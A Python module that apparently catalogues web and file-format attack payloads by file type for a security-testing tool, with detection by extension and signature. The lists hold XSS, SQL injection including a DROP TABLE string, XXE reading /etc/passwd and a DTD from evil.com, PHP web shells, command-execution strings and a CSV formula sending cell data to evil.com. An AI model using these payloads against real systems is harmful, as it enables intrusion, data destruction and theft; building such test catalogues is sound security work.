"""Headless payload catalog and file-type detection used by Hades services."""

import mimetypes
import os
from pathlib import Path


class PayloadGenerator:
    """Generate heuristic payloads based on file types"""
    
    # File type detection patterns
    FILE_TYPE_PATTERNS = {
        'javascript': {
            'extensions': ['.js', '.jsx', '.ts', '.tsx'],
            'signatures': [b'function', b'const ', b'var ', b'class '],
            'payloads': [
                "'; alert('XSS'); //",
                "\"; alert('XSS'); //",
                "<script>alert('XSS')</script>",
                "${7*7}",
                "#{7*7}",
                "<img src=x onerror='alert(1)'>",
                "javascript:alert('XSS')",
            ]
        },
        'sql': {
            'extensions': ['.sql'],
            'signatures': [b'SELECT', b'INSERT', b'UPDATE', b'DELETE', b'WHERE'],
            'payloads': [
                "' OR '1'='1' --",
                "admin'--",
                "' OR 1=1--",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL --",
                "'; WAITFOR DELAY '00:00:05' --",
            ]
        },
        'xml': {
            'extensions': ['.xml', '.svg', '.xsl'],
            'signatures': [b'<?xml', b'<root>', b'</'],
            'payloads': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
                "<!DOCTYPE test SYSTEM 'http://evil.com/test.dtd'>",
                "<svg/onload=alert('XSS')>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ELEMENT root ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            ]
        },
        'json': {
            'extensions': ['.json'],
            'signatures': [b'{', b'[', b'"'],
            'payloads': [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                '{"password": true}',
                '{"id": {"$gt": ""}}',
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            ]
        },
        'html': {
            'extensions': ['.html', '.htm'],
            'signatures': [b'<!DOCTYPE', b'<html', b'<head'],
            'payloads': [
                "<img src=x onerror='alert(1)'>",
                "<svg onload='alert(1)'>",
                "<script>alert('XSS')</script>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload='alert(1)'>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            ]
        },
        'php': {
            'extensions': ['.php', '.php5', '.phtml'],
            'signatures': [b'<?php', b'<?', b'echo', b'$_'],
            'payloads': [
                "'; system('id'); //",
                "'); system('id'); //",
                "\"; eval($_POST['cmd']); //",
                "<?php system($_GET['cmd']); ?>",
                "'; phpinfo(); //",
            ]
        },
        'python': {
            'extensions': ['.py'],
            'signatures': [b'import', b'def ', b'class ', b'print('],
            'payloads': [
                "__import__('os').system('id')",
                "eval(input())",
                "exec(input())",
                "__import__('subprocess').call(['sh','-c','id'])",
                "pickle.loads(user_input)",
            ]
        },
        'csv': {
            'extensions': ['.csv'],
            'signatures': [b',', b'\\n'],
            'payloads': [
                "=1+1",
                "=cmd|'/c whoami'!A0",
                "@SUM(1+9)*cmd|'/c calc'!A1",
                "-2+5+cmd|'/c powershell'!A1",
                "=WEBSERVICE('http://evil.com/'&A1)",
            ]
        },
        'pdf': {
            'extensions': ['.pdf'],
            'signatures': [b'%PDF'],
            'payloads': [
                "JavaScript embedded in PDF",
                "XFA form with malicious script",
                "Launch action payload",
            ]
        },
        'image': {
            'extensions': ['.jpg', '.jpeg', '.png', '.gif', '.bmp'],
            'signatures': [b'\\xFF\\xD8', b'\\x89PNG', b'GIF8'],
            'payloads': [
                "EXIF metadata injection",
                "Polyglot image/HTML",
                "Embedded malware",
            ]
        },
        'office': {
            'extensions': ['.docx', '.xlsx', '.pptx', '.doc', '.xls', '.ppt'],
            'signatures': [b'PK\\x03\\x04', b'D0CF11E0'],
            'payloads': [
                "VBA macro payload",
                "External data source injection",
                "OLE embedded object",
            ]
        },
        'path_traversal': {
            'extensions': [],
            'signatures': [],
            'payloads': [
                "../../../../etc/passwd",
                r"..\..\..\..\Windows\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ]
        },
        'archive': {
            'extensions': ['.zip', '.tar', '.gz', '.rar', '.7z'],
            'signatures': [b'PK\\x03\\x04', b'\\x1f\\x8b'],
            'payloads': [
                "Path traversal: ../../../etc/passwd",
                "Zip bomb/decompression bomb",
                "Symlink attack in archive",
            ]
        },
        'binary': {
            'extensions': ['.exe', '.dll', '.so', '.o'],
            'signatures': [b'MZ', b'\\x7fELF', b'\\xfe\\xed\\xfa'],
            'payloads': [
                "Buffer overflow payload",
                "ROP gadget chain",
                "Shellcode injection",
            ]
        },
    }
    
    @classmethod
    def detect_file_type(cls, file_path: str) -> str:
        """Detect file type by extension and signature"""
        path = Path(file_path)
        ext = path.suffix.lower()
        
        # Try to read file signature
        try:
            with open(file_path, 'rb') as f:
                signature = f.read(512)
        except:
            signature = b''
        
        # Check by extension and signature
        for ftype, patterns in cls.FILE_TYPE_PATTERNS.items():
            if ext in patterns['extensions']:
                # Verify with signature if available
                if patterns['signatures']:
                    for sig in patterns['signatures']:
                        if sig in signature:
                            return ftype
                return ftype
        
        # Fallback to mimetype
        mime, _ = mimetypes.guess_type(file_path)
        if mime:
            if 'image' in mime:
                return 'image'
            elif 'video' in mime:
                return 'image'  # treat similar to image
            elif 'application/pdf' in mime:
                return 'pdf'
        
        return 'unknown'
    
    @classmethod
    def get_payloads(cls, file_type: str) -> list:
        """Get payloads for file type"""
        if file_type in cls.FILE_TYPE_PATTERNS:
            return cls.FILE_TYPE_PATTERNS[file_type]['payloads']
        return []
    
    @classmethod
    def generate_payloads(cls, file_path: str) -> dict:
        """Generate payloads for a file"""
        file_type = cls.detect_file_type(file_path)
        payloads = cls.get_payloads(file_type)
        
        # Get file info
        try:
            file_size = os.path.getsize(file_path)
        except:
            file_size = 0
        
        return {
            'file_path': file_path,
            'file_name': Path(file_path).name,
            'file_type': file_type,
            'file_size': file_size,
            'detected_type': file_type,
            'payloads': payloads,
            'count': len(payloads),
            'categories': list(cls.FILE_TYPE_PATTERNS.keys()) if file_type == 'unknown' else [file_type]
        }
